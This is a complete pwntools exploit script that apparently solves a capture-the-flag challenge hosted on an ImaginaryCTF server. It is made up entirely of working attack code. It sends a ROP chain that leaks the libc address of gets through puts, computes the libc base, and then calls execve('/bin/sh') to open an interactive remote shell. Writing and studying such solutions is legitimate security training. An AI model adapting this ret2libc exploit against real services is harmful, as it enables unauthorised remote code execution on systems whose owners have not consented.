from pwn import *


target = remote('chal.imaginaryctf.org', 42020)
libc = ELF('libc6_2.28-10_amd64.so')

elf = ELF('speedrun_elf_remote')


pop_rdi = p64(0x000000000040120b) # : pop rdi ; ret
ret = p64(0x0000000000401016) # : ret

padding = ret * 200

payload = padding
payload += pop_rdi
payload += p64(elf.got['gets'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

target.sendline(payload)

print(target.recvuntil(b'Thanks!\n'))
result = target.recv(6)
print(result)
gets_libc = u64(result + b'\x00' * 2)
print(hex(gets_libc))

libc_base = gets_libc - libc.symbols['gets']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

#Who knows why, but it only accepts execve, not system. It's always worth it to try both!
system = libc_base + libc.symbols['execve']

pop_rsi_r15 = p64(0x0000000000401209) # : pop rsi ; pop r15 ; ret


payload2 = padding
payload2 += pop_rdi
payload2 += p64(binsh)
payload2 += pop_rsi_r15 + p64(0) * 2
payload2 += p64(system)

target.sendline(payload2)


target.interactive()
